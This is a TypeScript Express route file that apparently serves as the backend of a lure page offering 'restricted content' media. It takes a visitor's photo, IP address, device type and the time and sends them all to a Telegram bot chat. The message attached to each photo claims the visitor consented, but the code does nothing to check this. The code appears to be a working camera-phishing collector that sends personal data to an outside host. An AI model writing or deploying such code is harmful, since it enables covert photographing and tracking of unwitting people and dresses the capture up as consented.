import { Router, type IRouter } from "express";
import multer from "multer";

const router: IRouter = Router();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });

async function sendPhotoToTelegram(photoBuffer: Buffer, caption: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const form = new FormData();
  form.append("chat_id", chatId);
  form.append("caption", caption);
  form.append("parse_mode", "HTML");
  form.append("photo", new Blob([new Uint8Array(photoBuffer)], { type: "image/jpeg" }), "visitor.jpg");

  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
    method: "POST",
    body: form,
  });
}

router.post("/request", upload.single("photo"), async (req, res) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.socket.remoteAddress ||
      "Unknown";

    const mediaTitle = req.body.mediaTitle || "Unknown";
    const userAgent = req.headers["user-agent"] || "Unknown";
    const now = new Date().toLocaleString("en-GB", {
      timeZone: "Asia/Baghdad", hour12: false,
    });

    const isMobile = /mobile|android|iphone/i.test(userAgent);
    const device = isMobile ? "📱 Mobile" : "🖥️ Desktop";

    const caption =
      `🔐 <b>Access Request — Restricted Content</b>\n\n` +
      `📁 <b>Media:</b> ${mediaTitle}\n` +
      `🌐 <b>IP:</b> <code>${ip}</code>\n` +
      `${device}\n` +
      `⏰ <b>Time:</b> ${now}\n\n` +
      `<i>The visitor has given explicit consent before this photo was taken.</i>`;

    if (req.file) {
      await sendPhotoToTelegram(req.file.buffer, caption);
    }

    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Failed to send access request" });
  }
});

export default router;
